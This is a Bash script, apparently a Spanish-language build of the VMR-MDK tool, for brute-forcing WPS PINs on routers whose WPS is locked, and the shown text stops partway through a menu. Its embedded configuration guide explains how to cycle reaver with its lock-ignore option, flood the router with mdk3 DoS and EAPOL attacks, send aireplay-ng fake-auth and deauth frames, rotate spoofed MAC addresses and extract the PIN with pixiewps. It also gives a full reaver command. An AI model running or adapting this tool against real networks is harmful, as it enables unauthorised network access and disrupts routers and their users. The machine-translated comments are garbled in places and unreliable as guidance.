#!/bin/bash

##############################################
 
txtrst="\e[0m"      # Text reset 
warn="\e[1;31m"     # warning		   red         
info="\e[1;34m"     # info                 blue             
infod="\e[0;34m"
q="\e[1;32m"	    # questions            green
inp="\e[1;36m"	    # input variables      magenta
yel="\e[1;33m"      # typed keyboard entries
bold="\033[1m"    # bold text
normal="\033[0m" # normal text
#Under=\033[4mtype\033[0m\033[1;32m
##############################################

#List of main fuctions
#MDKMENU_fn() Mdk Dropdown Menu for quick reference
#DDOS_fn()  
#CONFIG_ADJUST_fn()
#CONFIG_DROP_fn() Dead DNA
#CONFIG_WRITE()
#airmon-old_fn()
#PDDSA_fn()
#MONMAC_fn()
#cleanup()
#control_c()
#PINFOUND_fn()
#ASSOC_CLIENT_fn()
#AIRDASSOC_fn()
#MACBLOCK_fn()
#AIREPLAY_fn()
#SELECT_DEVICE_fn()
#BOOST_DEVICE_fn()
#SELECT_MONITOR_fn()
#MACERROR_HANDEL_fn()
#MANUAL_SELECT_fn()
#ASSGNERROR_HANDEL_fn()
#REAVER_MENU_fn()
#WPS_PINHELP1_fn()
#TIMING_LOCKED_fn()
#WPS_DEFAULTPINS_fn()
#MACBLOCKCHOICE_fn()
#R_BOOLEANS_fn()
#STARTPIN_BOOLEANS_fn()

ADVANMON=y
ADVAN_TIME=120
AP_HIDDEN=ZZZ
AP_HIDDENTEST=ZZZ
CHANNEL_LOCK=ZZZ
CHANNEL_MAN=0
COUNTTEST=ZZZ
DEVTEST=ZZZ
ENTER_NAMETEST=ZZZ
ERAS=ZZZ
ERASTEST=ZZZ
EVTEN=0
LIVE1=180
MONTEST=ZZZ
NAME1=XXX
NOTEMPT=ZZZ
PIN_MANTEST=ZZZ
PIN_SELECTEST=ZZZ
PIXIE_OVERIDE=0
SOURCEGOODTEST=ZZZ
SOURCENAMETEST=ZZZ
STARTPIN=12345670
USE_LONG1=ZZZ
USE_PIN1=XXX
USE_PIN1TEST=ZZZ
USE_PIXIE=ZZZ
USE_R1=ZZZ
WASHNAMETEST=ZZZ
WPS_COM=ZZZ
WPS_COMTEST=ZZZ

WPS_PIN1=00000000
WPS_SIZE1=8

chmod -f 755 /root/mdk3-v6/*

MDKTXT1="DOS1/DOS2/DOS3"
MDKTXT2="EAPOL PF1/EAPOL PF2/EAPOL PF3"
MDKTXT3="DOS1/DOS2/EAPOL PF3"
MDKTXT4="DOS1/EAPOL PF2/EAPOL PF3"
MDKTXT5="EAPOL Logoff1/EAPOL Logoff2/EAPOL Logoff3"
MDKTXT6="DOS1/DOS2/EAPOL Logoff3"
MDKTXT7="EAPOL Logoff1/EAPOL Logoff2/DOS3"
MDKTXT8="EAPOL Logoff1/EAPOL Logoff2//EAPOL PF3"
MDKTXT9="EAPOL Logoff1/EAPOL PF2/EAPOL PF3"
MDKTXT10="EAPOL Logoff1/EAPOL PF2/DOS3"
MDKTXT11="Tkiptun-ng1/Tkiptun-ng2/Tkiptun-ng3"
MDKTXT12="Invalid SSID1/Invalid SSID2/Invalid SSID3"
MDKTXT13="DOS1/Invalid SSID2/Invalid SSID3"
MDKTXT14="DOS1/DOS2/Invalid SSID3"
MDKTXT15="DOS1/EAPOL Packet Flooding 2/Invalid SSID3"

clear
echo ""
echo -e "$info VMR-MDK-ES011x8.sh(Kali1.1a Only)"
echo "   Espanol Version"
echo -e "$yel                            |||||||||||||||||||||||||"
echo -e "$yel                            ||$info WPS PIN  JAIL BREAK$yel ||"
echo -e "$yel                            |||||||||||||||||||||||||"
echo ""
echo -e "$info            In Memory of Alan M. Turing and the work of Betchly Park"
echo -e "$info    If you eliminate the wrong solutions you are left with the right answer."
echo ""
echo -e "$info                 All Thanks To Vulpi, Wn722, Slim 76, Soxrok2212"
echo ""              
echo -e "$info                   	    Inspired By The Band SRC"
echo -e "$info                      Next To Milestones On The Plain Of Jars"
echo -e "$info                        In Undertaking This Work We Were"      
echo -e "$info                  Up All Night Near The Hall Of The Mountain King"
echo ""
echo -e "$info                    A Musket Team Special Case WPS Pin Harvester"
echo -e "$warn                           !!!!USE WITH KALI 2.0 ONLY!!!!"
echo ""
echo -e "$yel   -->$info Todas las interfaces de monitor existente $yel( mon0 mon1 etc.)$info Se borrará$yel <--$txtrst"
echo -e "$yel    -->$info En Red-Manager Applet(Esquina superior derecha de la pantalla)$warn ASEGURAR$yel <--$txtrst"
echo -e "$yel                -->$info Habilitar red es$yel No seleccionado $warn(no seleccionado)$yel <--$txtrst"
echo -e "$yel                    -->$info Activar wi-fi$yel comprobado$warn (seleccionado)$yel <--$txtrst"
echo
while true

do
echo -e "$inp                              presiona $yel(y/Y)$inp continuar...."
echo -e "         presiona $yel(n/N)$inp abortar!!..Pulse cualquier otra tecla para volver a intentarlo:$txtrst"

  read CONFIRM
  case $CONFIRM in
    y|Y|SI|si|si) break ;;
    n|N|no|NO|No)
      echo Abortar - que ha introducido $CONFIRM
      exit
      ;;

	  esac

		done

echo -e "$info  Entraste $CONFIRM.  continuando ...$txtrst"
sleep 3

clear


#~~~~~~~~~~Start  Configfile Start~~~~~~~~~~#
CONFIG_WRITE()
{

CONFIG_SELECT=$(echo -e "#
#configfiledetailed011x8-01
#
#    El archivo de configuración se detalla es un archivo de configuración para su uso con VMR-MDK011x8.sh
#  Puede cambiar el nombre para que coincida con sus objetivos y almacenar todos los archivos de configuración en el
#  Carpeta VARMAC CONFIG. Los archivos de configuración deben estar ubicados en la carpeta VARMAC CONFIG única!
#  Usted puede tener tantos archivos de configuración como desee. Durante la instalación del programa se le dará la
#  opción de elegir qué archivo de configuración que desea utilizar en contra de la targetAP elegido y altera
#  el archivo para cumplir con las condiciones vistos.
#
#    Este es un programa caso especial significado para atacar a los routers que muestran un estado WPS bloqueado.
#  El script se puede utilizar contra routers con WPS sistemas desbloqueados mediante el establecimiento de
#  PAUSA = 120. El live1 = se puede ajustar a cualquier longitud que la situación requiere. El uso de mdk3
#  contra los sistemas abiertos WPS es caso por caso, pero por lo general no es necesario. Para no utilizar conjunto MDK
#  MDKTYPE1=0 y MDKLIVE=0.
#
#    En general un router WPS bloqueado debe mostrar lo siguiente cuando es atacado por pin
#  cosecha para tener éxito.
# 
#    1. El router permite pin cosecha luego cerraduras O muestra un estado bloqueado, pero permite
#   colección pin limitada entonces deja de proporcionar pasadores.
#    2. Router es entonces DDOSed con mdk3.
#    3. Después de ser DDOSed, el router puede mostrar un estado bloqueado, pero permite más pin
#   la cosecha antes de la recogida pin detiene de nuevo.
#    4. Si más DDOsed con mdk3, otra serie de pasadores WPS se puede cosechar.
#
#    Este script es una prueba de concepto y permite sólo una(1) objetivo orientativo AP se va a cargar en el
#  archivo de configuración. Debido a la compleja serie de comandos, sólo un enfoque automatizado tiene
#  cualquier posibilidad de romper WPS bloqueado routers que presentan este defecto. Este guión fue desarrollado
#  en tiempo real contra routers mostrando esta falla y todos fueron agrietada.
#
#    Corriendo VMR-MDK011x8.sh
#
#    Asegúrese de que ha permitirá ejecutar archivo como un programa. Ir a las propiedades de la
#  archivo, abra una ventana de terminal y escribe:
#
#			 chmod 755 VMR-MDK011x8.sh .
#
#    puede colocar en root/ abrir una ventana de terminal y escribe ./VMR-MDK011x8.sh o el lugar
#  en usuario/bin/ y escribe VMR-MDK011x8.sh en una ventana de terminal.
#
#    En la escritura de iniciar el programa se abrirá lavado y escanear en busca de objetivos. Cuando un objetivo de AP
#  el interés se ha encontrado, siga las indicaciones y el guión va a continuar. Una lista de los numerada
#  aparecerá objetivos. Seleccione el número de la línea de la meta que desea atacar. Una vez que tú
#  seleccione su destino el guión escribirá un archivo de configuración para el /root/VARMAC_CONFIG/
#  carpeta con el nombre del archivo del router (ESSID) seguido por el mac address. Si el
#  existe el archivo no va a sobrescribir el archivo. Usted puede seleccionar el archivo o elegir a otra persona
#  uno. Te sugiero que mantener un archivo por destino. Si utiliza y luego no se utiliza --dh-small / -S
#  reaver puede restablecer el número de pines y el ataque se debe reiniciar. 
#
#    Al seleccionar la configuración que desea utilizar. Aparecerán los detalles del archivo de configuración
#  en la pantalla. Usted puede hacer cualquier cambio a través del menú. Más tarde se puede ajustar la configuración
#  en este archivo mientras el programa se está ejecutando con leafpad. Abra el archivo, realice los cambios,
#  guardar el archivo, y los cambios entrarán en vigor al comienzo de la etapa de 2,3 y 4.  
#
#    El Ciclo de Ataque se divide en cuatro(4) stages
#
#   Stage 1   - Analiza disponibilidad destino
#   Stage 2   - Reaver pin colección
#   Stage 3 - Mdk3 DDOS
#   Stage 4  - Wash escanear para la recuperación router y pixiewps prueba paraWPS pin 
#
#   Atacar Ciclo Información general
#
#   Todas las etapas del programa se basan tiempo para forzar al programa para el ciclo.
#
#  1. Reaver ataca el router como seleccionado por el usuario. Estado hay un -L ignorar bloqueado
#  incrustado en TODAS las líneas de comando reaver. Reaver nunca reportar el router está bloqueado. Ello
#  se puede deducir por la falta de recolección de pin o sólo durante la etapa de exploración de lavado IV.
#  2. Reaver se apaga según el tiempo en LIVE1= seleccionados por el usuario en el archivo de configuración.
#  3. El programa entonces ataca el router con mdk3 durante el tiempo seleccionado en el archivo de configuración.
#  Hay 15 diferente mdk3 combinaciones. El valor predeterminado es el número tres(3).
#  4. Programa luego hace una pausa mientras wash escanea todos los canales, lo que permite que el router se recupere. 
#  Justo antes de la exploración de lavado, pixiewps 1.1 puede probar el archivo de registro para el WPS pin.
#  5. La dirección MAC es entonces cambiado o renovado y reaver reinicia y el ciclo continúa.
#  6. Si el WPS pin se encontró que se cargará en reaver automáticamente
#  7. Los usuarios pueden modificar el archivo de configuración que el programa se está ejecutando a
#  cumplir con la respuesta y condiciones Routers como se ve.
#
#    entradas de configuración EMPEZAR ABAJO
#
#  CHANNEL1= es el canal de targetAP1
#
#  MDK3 puede hacer que el router para cambiar de canal, por tanto:
# 
#  Ingrese número de canal cero(0) Solo para WPS enrutador bloqueado o si mdk3 está empleado.
#
#  Cuando CHANNEL1=0 el programa se ajuste el canal de forma automática.
#
###=========================
CHANNEL1=0
###=========================
#
#    los  -r, --recurring-delay=<x:y> command
#  ebe ingresar ya sea Sí o No en este bloque
#  yo. El sueño de Y segundos cada intentos x pin.
#  Usted puede optar por ejecutar Reaver con o sin la -r command. 
#  Para usar -r x:y commands con reaver entrar y después de la USE_R= (es decir USE_R=y).
#  A no usar el -r command introducir n después de la USE_R= (es decir USE_R=n).
#  If -r commands se van a utilizar se debe introducir el x y las entradas de Y
#  en el -r x:y abajo  el x = RX1 y y = RY1 para targetAP1 (es decir RX1=3 RY1=15).
#
# Escriba S o N abajo
###=========================
USE_R1=y
###=========================
#
# Introduzca el número de solicitudes RX1 y período de descanso RY1 en segundos
###=========================
RX1=2
#
RY1=15
###=========================
#
#    LIVE1= es la cantidad de tiempo en segundos que el ataque reaver se llevará a cabo en contra de la
#  targetAP. Puede establecer la cantidad de tiempo depende de la reacción visto por el targetAP.
#
# Ingrese tiempo en segundos no menos de 120 para las operaciones normales abajo;
###=========================
LIVE1=120
###=========================
#
#    Este programa contiene una reaver command la línea destinada a ser utilizada en contra targetAPs los cuales son
#  en el rango extremo. Si usted tiene una RSSI( indicador de intensidad de señal relativa ) que muestra una
#  número mayor que 72, cambiar el USE_LONG1=n a USE_LONG1=y y darle una oportunidad..
#  Por otra parte, cuando los routers están bloqueados, pero todavía proporcionan pasadores, esta command la línea es lo que tiene
#  ha visto obtener pasadores cuando no hay otra commmand líneas fueron efectivos.
#  USAR PARA WPS ROUTERS BLOQUEADO
#   El valor predeterminado es
#  (i.e. si)
#
# Ingrese y o por debajo de n;
###=========================
USE_LONG1=y
###=========================
#
#    los MDKTYPE1 Determina variables los types de mdk3 para ser usado. los programa permite 15
#  diferente mdk3 combinaciones de de tres(3).
#    Tres(3) mdk3 DOS  entrar 1
#    Tres mdk3 EAPOL Packet Flooding entrar 2
#    Dos(2)mdk3 DDOS y Uno(1)mdk3 EAPOL entrar 3
#    Uno(1)mdk3 DDOS y Dos(2)mdk3 EAPOL entrar 4
#    Tres(3) EAPOL Logoff entrar 5
#    Dos(2)mdk3 DDOS y Uno(1)mdk3 EAPOL Logoff entrar 6  
#    Uno(1)mdk3 DDOS y Dos(2)mdk3 EAPOL Logoff entrar 7
#    Uno(1)mdk3 EAPOL Packet Flooding y Dos(2)mdk3 EAPOL Logoff entrar 8     
#    Dos(2)mdk3 EAPOL Packet Flooding y Uno(1)mdk3 EAPOL Logoff entrar 9
#    Uno(1)mdk3 EAPOL Packet Flooding, Uno(1)mdk3 EAPOL Logoff y Uno(1) mdk3 DOS entrar 10
#    Tres(3) tkiptun-ng ataques entrar  11
#    Tres(3) no válido SSID ataques entrar 12
#    Uno(1) DOS y Dos(2) no válido SSID ataques entrar 13
#    Dos(2) DOS y Uno(1) no válido SSID ataques entrar 14
#    Uno(1) DOS, Uno(1) no válido SSID y Uno(1) EAPOL Packet Flooding ataques entrar 15
#     
#    A partir de los routers que hemos visto que responden a este enfoque, el tercero(3) elección
#  parece ser el primero elección. Sin embargo, el autor de ReVdK3 reporta un alto éxito con   
#  type 2 o pura EAPOL. Elección 4 y 14 también ha mostrado buenos resultados. 
#
#  Para no utilizar DDOS set a cero(0) i.e. MDKTYPE1=0 y MDKLIVE=0
#
# entrar 0 a través de 15.
####=========================
MDKTYPE1=14
####=========================
#
#    los MDKLIVE variable es la cantidad de tiempo en segundos que desea DDOS el router.
#  Los valores entre 12 y 20 segundos es generalmente eficaz. Muchas veces las longitudes
#  de 30 a 45 segundos porque el router deje de responder. 
#
#  Para no utilizar DDOS conjunto MDKTYPE1=0 y MDKLIVE=0
#
# Ingrese tiempo en segundos por debajo.
###========================= 
MDKLIVE=15
###=======================
#
#    Este programa cuenta con cuatro(4) stages, Stage uno es pre-escaneo reaver, etapa 2 es reaver pin
#  cosecha, stage 3 es mdk3 DDOS y stage 4 es un período de recuperación del router pausa
#  con wash escanear en busca de la recuperación del router y el canal utilizado después MDK3. los
#  PAUSA = establece el tiempo para hacer una pausa en Stage IV. 
#
# Ingrese tiempo en segundos por debajo.
###=========================
PAUSE=90
###=========================
#
#    Sobrecalentamiento del ordenador debido a la carga de proceso del programa. 
#  Algunos ordenadores portátiles en particular tienden a recalentarse cuando temporizadores con cuenta atrás para el reaver, mdk3
#  y los procesos de lavado se realizan. La carga más alta es durante el mdk3 stage. Si su equipo
#  sobrecalienta puede activar estos contadores o desactivar mediante el ajuste de los tres siguientes(3)
#  control variables.
#
# Temporizador de cuenta atrás para el reaver stage. Ingrese y de usar y n no utilizar. 
###=========================
REAVER_COUNT=y
###=========================
#
# Temporizador de cuenta atrás para MDK3 stage. Ingrese y de usar y n no utilizar.
#
###=========================
MDK3_COUNT=y
###=========================
#
# Temporizador de cuenta atrás para Pause/wash stage, Ingrese y de usar y n no utilizar.
#
###=========================
WASH_COUNT=y
###=========================
#
#    los DAMP_MDK variable(es decir Humedezca MDK3) permite mdk3 para funcionar sólo cuando targetAP
#  la actividad se ve . Durante el reaver proceso, SI DAMP_MDK=y ha sido seleccionado,
#  el río está a cargo de los intervalos indicados por el ADVAN_TIME variable abajo
#  Buscando targetAP actividad. Si no hay actividad enrutador es visto por el tiempo que el ADVAN_TIME
#  ha expirado, mdk3 se suprime para evitar la interrupción de la targetAP aún más.
#    Si simplemente desea ejecutar en silencio hasta que se ve la actividad del router; a continuación, humedezca
#  mdk3 mediante la introducción de DAMP_MDK=y. Si targetAP la actividad se ve, después mdk3 la actividad será
#  comenzar. Esta variable no se apaga mdk3 por completo. Sólo causas mdk3 esperar
#  hasta targetAP función es visto.
#
#  Nota esta variable debe ser y en la mayoría de los casos.
#
#  Ingrese y para sí o para los n no.
###=========================
DAMP_MDK=y
###=========================
#
#    Monitoreo Advanced es controlado por el DAMP_MDK variable(es decir Humedezca MDK3). Si
#  DAMP_MDK=y se selecciona a continuación monitorización avanzada se activa.
#    Cuando el router se somete a mdk3 algunos routers toman mucho tiempo para recuperarse. Si el
#  enrutador es golpeado de nuevo con mdk3 antes de aceptar solicitudes pin WPS puede conseguir derribado
#  línea de nuevo. Para tratar de contrarrestar esto, el guión puede escanear salida reaver buscando
#  reaver asociación o respuesta. Si la asociación parece estar ocurriendo, entonces avanzado 
#  monitoreo se termina y Reaver tiempo en directo según lo establecido por LIVE1= se inicia y el programa
#  ciclos forward. Si no se observa asociación o enrutador de respuesta, entonces el programa se ejecuta
#  reaver hasta el momento en el ADVAN_TIME expira.
#    La característica avanzada de Seguimiento tiene 10 barridos de exploración buscan actividad enrutador.
#  Los primeros dos (2) barridos de escaneo, escanea salida del archivo reaver cada 15 segundos hasta
#  30 segundo ha pasado en busca de la asociación o la respuesta del router. La exploración de archivos entonces toma
#  colocar cada aproximadamente 1/8 de la ADVAN_TIME establecido por el usuario. Por lo tanto, si 800 segundos se establece
#  como la ADVAN_TIME, el archivo será escaneado aproximadamente cada 100 seg. 
#  Ingrese la longitud máxima de monitorización avanzada de tiempo se ejecutará buscando targetAP respuesta.
# 
#  Ingrese segundos
###==========================
ADVAN_TIME=120
###=========================
#
#    los USE_AIRE1= y el USE_AIRE0= son aireplay-ng controladores
#    Aireplay-ng se ejecutará simultáneamente con reaver para ayudar a activar la respuesta del router
#  reaver pin solicitudes, como un método de determinación de intensidad de señal y para tratar de
#  inducir la activación de router. Si reaver es salto de canal, aireplay-ng no será activado.
#  Durante la fase de exploración stage 1, que se divide en 10 ciclos de escaneo, de dos(2) ventanas eterm
#  corriendo aireplay-ng --fakeauth y --deauth se puede ejecutar en el inicio de cada una de ellas
#  barridos de exploración. Si no se observa respuesta del router, estas ventanas se cierran para ser
#  reactivado en el comienzo de la siguiente barrido de exploración.
#    Muchas veces los routers no responden a Reaver asociación HASTA activado por aireplay-ng.
#  Puedes usar --fakeauth sin restricción pero el uso de --deauth debe ser limitado y
#  desactivado una vez que el router está funcionando
#
#  los USE_AIRE1=y  controles aireplay-ng -1 --fakeauth
#  los USE_AIRE0=n  controles aireplay-ng -0 --deauth
#  Puede ejecutar ambos aireplay-ng -1 y -0 o seleccione uno y apague la otra.
#
#  Ingrese y Activar aireplay-ng -1 --fakeauth o n a no usar.
###=========================
USE_AIRE1=y
###=========================
#
#  Ingrese y Activar aireplay-ng -0 --deauth o n a no usar.
###=========================
USE_AIRE0=n
###=========================
#
#    Recopilación Pixiedust data - Consideraciones importantes
#  El autor de Pixiedust señala que para algunos routers como RealTek, pixiewps no puede extraer
#  el pasador si el --dh-small/ o -S se utiliza en el reaver command line. Por lo tanto para la obtención de
#  Pixiedust data probablemente es mejor no usar --dh-small
#     Por otro lado cuando se enfrenta a un router WPS bloqueado, se ha visto que muchos
#  veces sólo el uso de --dh-small extraerá lentamente WPS pins.
# 
#  La mejor solución es utilizar --dh-small es decir USE_DHSMALL=y y USE_FIRSTPIN=y. Las razones son
#  se explica a continuación
#
#  Ingrese y para usar --dh-small o n a no usar --dh-small.
###=========================
USE_DHSMALL=y
###=========================
#
#    Si usted sospecha que el router está empleando mac bloqueo se puede asignar un mac específico para
#  reaver en cualquier momento.
#  Colocar n / N permitirá una dirección MAC aleatoria que se asignará. Si desea asignar un
#  dirección MAC específica entrar a / a en la variable MACSEL e introduzca la dirección MAC que
#  requiere en la entrada ASSIGNMAC.
#
#    Ingrese y para introducir una dirección MAC específica o n para generar direcciones MAC aleatorias.
#  Si MACSEL=y tú MUST Ingrese una dirección MAC válida en el ASSIGN_MAC=  abajo. 
###=========================
MACSEL=n
###=========================
#
#    El cuidado debe tomada aquí al ingresar manualmente la dirección mac. Utilice el siguiente formato
#  SOLAMENTE !!!! No existe un tratamiento de errores si el cambio se realiza mientras el programa está en ejecución
#
#  Utilice caracteres HEX SOLAMENTE con dos puntos. Ejemplos a continuación:
#  00:11:22:33:44:55  or AE:BD:CF:10:20:DD
#
###=========================
ASSIGN_MAC=94:39:E5:D7:28:95
###=========================
#
# Pixiedust consideraciones:
#
#    Para encontrar el PIN WPS a través de Pixie Dust, el usuario debe descargar e instalar un mod reaver
#  programa por soxrok2212, t6_x y Datahead y descargar e instalar la última pixiewps
#  programa por cable. Ver foros kali-linux para sitios de descarga de utilizar y teoría general.
#
#    Una vez instalado el reaver modded, salida de voluntad reaver una serie de datos. Estos datos
#  ser enviados como parte del ataque reaver en formato de texto en el archivo impreso por VMR-
#  MDK en el VARMAC_LOGS directorio.   
#    Este paquete viene con una llamada de programa auxiliar PDDSA-06.sh(i.e. Pixie Dust Data Secuencia
#  Analyzer). Si quieres poner a prueba para ver si pixiewps puede obtener el WPS pin carrera VMR-MDK
#  y obtener alguna data a continuación, apague VMR-MDK y correr PDDSA-06.sh de root y siga menú
#  indicaciones. No haga funcionar los dos programas al mismo tiempo. Si obtiene la WPS pin período previo VMR-MDK,
#  seleccione para acceder al WPS pinmanualmente y continuar el ataque. Leer el archivo de ayuda
#  sobre celebración WPS pins y la copia de los archivos WPC. Este archivo de ayuda se puede seleccionar cuando el
#  menú del programa le da al usuario la opción de entrar en un WPS pin.
#
#  Usando Pixie Dust Data Analizador de secuencias, mientras VMR-MDK está funcionando
#
#    A modificado Pixie Dust Data Secuencia del analizador puede ser utilizado para probar cada registro como
#  escrito en el /root/VARMAC_LOG carpeta mientras VMR-MDK Esta corriendo. Al comienzo de la
#  wash exploración pixiewps puede probar la primera secuencia de datos de polvo de hadas en el archivo.
#    Solo uno(1) secuencia se pondrá a prueba y la fuerza bruta no está disponible. Si desea probar
#  todas las secuencias o la fuerza bruta de los datos en el uso de archivos PDDSA-06.sh que está encerrado
#  con este paquete. 
#    Si se encuentra un pasador de WPS, a continuación, el pasador de WPS se cargará automáticamente en el reaver
#  command la línea y el ataque va a continuar. Los usuarios deben tener en cuenta el pasador. Si usted tiene que
#  reiniciar el ataque tendrá que volver a introducir el PIN a través del programa de mensajes del sistema durante
#  configuración del programa.
#
#  Ingrese y para usar pixiewps o n para no utilizar esta función.
###=========================
USE_PIXIE=y
###=========================
#
#    Cuando los routers son sometidos a MDK3, o procesos de router se interrumpen o el router
#  se reinicia, el pasador de WPS puede restablecerse a 12.345.670 durante el ataque. Dado que este es el
#  primer pasador marcada, reaver comprobará todos los otros pines subir a 99,99% y alto. Esta es la razón por
#  el reinicio 99,99% trabaja. Para comprobar para ver si el PIN WPS ha reiniciado puede indicar al
#  programa para volver a comprobar el pasador 12345670 cada x reinicios. Esta comprobación no utiliza --dh-small
#  permitiendo así Pixiedust para trabajar en los datos obtenidos a través de NO --dh-small
#
#  Ingrese y/Y verificar 12345670. Ingrese n/N no usar la característica.
###=========================
USE_FIRSTPIN=y
###=========================
#
#    El RETESTPIN establece la frecuencia que desee para volver a probar pin 12345670. Los ciclos de programación   
#  a través de las cuatro etapas del programa. Usted puede tener retest reaver cada X ciclos. Por ejemplo el establecimiento
#  10 en la variable RETESTPIN significa que cada décima de reinicio, el programa pondrá a prueba 12345670
#  en lugar de continuar la fuerza bruta. De probar la primera ping falla el programa continúa
#  la secuencia de la fuerza bruta en que se detuvo. Tiempo en vivo para reaver se establece en 120 segundos cuando
#  pruebas pin 12345670.
#
#  Ingrese un número mayor then 0 
###=========================
RETESTPIN=50
###=========================
#
#    Cambio de los ajustes de configuración
#
#    Puede modificar este archivo mientras se ejecuta el programa. Al final de cada uno de tres(3)
#  etapas de las cuatro etapas (es decir reaver, mdk3 y lavado), el archivo de configuración se vuelven a cargar.
#  Puede refinar el ataque para satisfacer las condiciones observadas. Sólo tienes que abrir el archivo de configuración, haga su
#  cambios y guardar el archivo. Estos cambios se cargan en el inicio de la etapa y de 2,3 4.
#
#    El desarrollo de su ataque - Pruebas Router inicial
#
#    Cada router, incluso los routers de la misma marca y modelo se han visto a reaccionar de manera diferente.
#  El primer objeto es descubrir si el router se dará por vencido pasadores pesar lavar y
#  reaver indican que el router está bloqueado.
#
#  Configuración Para las pruebas iniciales
#
#    Reaver Etapa Uno y Dos - Configuración inicial 
#  Ajuste el reaver vez en vivo en 120 segundos y utilizar la línea de comandos larga reaver configurando
#  USE_LONG1=y - Usted puede usar o no usar el -r x:y función, pero le sugerimos -r 3:15.
#  Recuerde que todas las líneas de comando reaver han los -L ignorar cerraduras incrustados.
#  Ajuste el canal a cero(0) para permitir saltos de canal. Sólo proporcionar un canal después de que esté
#  100 % Asegúrese de que el router no saltará los canales después de la etapa mdk3 o estás usando
#  el programa para atacar a los routers que no cerraba su sistema WPS cuando mdk3 no se utiliza.
#
#    MDK3 Stage Tres - Configuración inicial
#  Ajuste el mdk3 tiempo en directo para 20 y el segundo mdk3 type a 3.
#
#    1. Algunos routers no son afectados por mdk3.
#    2. Algunos routers cuando golpeó con mdk3 cerraron y no aparecen.
#    3. Algunos routers cuando golpearon con incluso una corta ráfaga de mdk3 type 3 desaparecer y luego
#  reaparecer muchas veces en un canal diferente y permitir pin recolección.
#    4. Algunos routers cuando se somete a largas ráfagas de mdk3 desaparecen durante muchos minutos y
#  cuando el entonces reapareciendo puede o no permitir la recogida pin.
#    5. Después de ser sometido a mdk3, el router no puede responder a lavar PERO cuando reaver
#  intenta obtener pines con entrada aireplay-ng, el router responde a las peticiones de reaver
#  para pins. 
#    6. Empezar mediante el uso de explosiones cortas de mdk3 en un primer momento alrededor de 15 a 20 seg.  
#
#     PAUSA/Wash Analiza Fase Fase Cuatro con Pixiedust ataque - Configuración inicial
#
#  El ciclo de pausa permite que el objetivo APP para recuperar y analiza la salida de lavado para el
#  orientar la dirección MAC del AP. Si aparece el objetivo, el programa establece el canal para reaver.
#
#    Si no se encuentra el objetivo, el canal se establece en 0 (cero), que para este programa
#  significa salto de canal. Cuando se reinicia Reaver, automáticamente entra en el modo de exploración.
#  Si el destino no responde a Reaver, entonces mdk3 serán suprimidos si
#  DAMP_MDK=y se selecciona..
#
#   Probar el programa
#
#    Comience el ataque y dejar que el ciclo del programa a través de los cuatro (4) etapas de un par de veces. si tu
#  obtener pasadores intentan ajustar la mdk3 tiempo en vivo inferior y aumentan reaver tiempo en vivo y
#  tiempo de pausa para cumplir con el tiempo de recuperación del router necesario. Si se recogen no pines
#  aumentar el tiempo mdk3 y ver si el router se reiniciará. 
#
#     El ataque ideal es que el router para permitir pin cosecha en algún momento después de estar
#  sometido a mdk3, Después de un período de tiempo que el router deja de proporcionar pasadores hasta que esté
#  sometido a mdk3 de nuevo. Por lo general, después de mdk3 puede haber un período anterior a la del router
#  proporciona alfileres y muchas veces los canales de cambios de router.
#
#    Rara vez hemos visto el sistema WPS para desbloquear después mdk3. La única indicación de que mdk3
#  si que afecta el router es que se recogen más pines WPS.
#
#    WPS Predeterminado Pins
#
#    Pasadores defecto pueden ser generados durante la instalación del programa. Hay cuatro (4) pin por defecto
# generadores incrustados. Durante la instalación, el usuario tiene la opción de la fuerza bruta de todo pins,
#  cargar un pin específico o generar pin por defecto para la selección.
# 
#    Si conoce el WPS anterior Pin utilizado por el objetivo, ejecutar ese pin primero antes
#  fuerza bruta todos los 11.000 alfileres. Cuando se cambia una clave WPA es raro que la WPS Pin es
#  también cambiado,
#
#    Routers con sistemas WPS que no están bloqueados.
#
#
#  El mosquete Equipos 99.99% ataque de reproducción
#
#    Los equipos han visto casos en que sólo el uso de VMR-MDK y la larga reaver command línea
#  lograba arrastrar pasadores de algunos routers WPS incluso cuando estaba abierto. En muchos casos el uso de
#  el USE_LONG1=y, junto con el muy corto de 12 a 15 segundos explosiones de tipo mdk3 4 logrado
#  lentamente recoger alfileres WPS. Por lo general, la colección pin de repente salta a 91% y luego muy
#  lentamente durante tres (3) a cuatro (4) días de recogida pin se elevaría a 99,99%, dejando sólo una(1)
#  pin restante. En ese momento, reaver haría girar interminablemente. Para recoger el último pasador de cierre
#  abajo VMR-MDK.
#
#  A continuación abra una ventana de terminal y escriba:
#
#  reaver -i mon0 -c 1  -b xx:xx:xx:xx:xx:xx -L -E -vvv -T 1 -t 20 -d 0  -x 30
#    --session=tmp/test12345670
#
#   Nota: De acuerdo a los comentarios en los foros de kali-linux l uso de -vvv con el modded reaver
#   para duendecillo polvo se enciende toda la salida de datos. Los equipos no pueden confirmar esto, sin embargo todo command
#   líneas tienen -vvv en lugar de -vv.
#
#    Aviso hemos eliminado la -ay -f y -S y la --session no interrumpirá la
#  ataque de fuerza bruta en curso
#
#    Type entrar. Reaver puede pedirle que restaurar la sesión anterior? Si lo hace
#  entrar (n/N ) es decir NO. Reaver debe comenzar una nueva sesión y la WPS y WPA key
#  puede verse en una (1) solicitud por pin reaver.
#
#    Entrando específica pins
#
#
#     FALLOS - Algunos usuarios han informado de que reaver no volverá a cargar automáticamente
#  una sesión anterior, cuando comienza la etapa reaver. No podemos duplicar esta. Tenemos
#  incluido VMR-MDK009y2.sh en un intento de corregir este.
#
#    RF Mata errores al hacer monitores mon0 etc - Compruebe el icono de su network-manager superior
#  esquina derecha de la pantalla. La conexión inalámbrica permitirá debe comprobarse mientras permita la creación de redes
#  debe estar sin marcar.
#
#    Queremos nuevamente gracias soxrox2212,Wn722, Slim76 y los autores de autoreaver y
#  ReVdK3. Hemos tomado las ideas de todas estas fuentes.
#
")


if [ ! -f  "/root/VARMAC_CONFIG/configfiledetailed" ]; then

		echo "$CONFIG_SELECT" > /root/VARMAC_CONFIG/"configfiledetailed"	

			fi

if [ ! -z  $CON_FILENAME1 ] && [ ! -f  "/root/VARMAC_CONFIG/$CON_FILENAME1-$MACALNUM" ]; then


		echo "$CONFIG_SELECT" > /root/VARMAC_CONFIG/"$CON_FILENAME1-$MACALNUM"

		        fi

}
#~~~~~~~~~~Fin  Configfile Fin~~~~~~~~~~#

#~~~~~~~~~~~Empezar DDOS Menú desplegable Empezar~~~~~~~~~#

MDKMENU_fn()
{

MDKMENU=$(echo -e "Menu Selection DDOS(Stage III)

No.   Attack Types In Groups Of three(3) 
\033[1;36m1.  DOS1 - DOS2 - DOS3\033[1;0m
